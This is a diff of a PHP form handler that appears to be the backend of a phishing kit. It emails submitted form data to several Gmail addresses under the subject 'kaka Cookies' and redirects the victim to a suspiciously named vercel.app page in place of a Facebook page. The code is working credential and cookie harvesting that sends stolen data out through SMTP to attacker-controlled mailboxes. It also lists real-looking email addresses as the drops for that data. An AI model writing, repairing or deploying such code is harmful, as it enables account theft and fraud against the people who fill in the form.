@@ -2,9 +2,9 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://web.facebook.com/me");
+header("Location: https://sure-account-data-here.vercel.app/");
 
-require 'Exception.php';
+require 'Exception.php'; 
 require 'PHPMailer.php';
 require 'SMTP.php';
 
@@ -34,18 +34,19 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
 
         // Email properties
-        $mail->setFrom('Lernayouamzaxal@gmail.com', 'passss');
-        $mail->addAddress('bkaka5581@gmail.com');
+        $mail->setFrom('Lernayouamzaxal@gmail.com', 'Ghaliya');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
+       $mail->addAddress('Lernayouamzaxal@gmail.com');
+      $mail->addAddress('morginmocin@gmail.com');
+      
 
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'kaka';
+        $mail->Subject = 'kaka Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
-
 
         // Send email
         $mail->send();
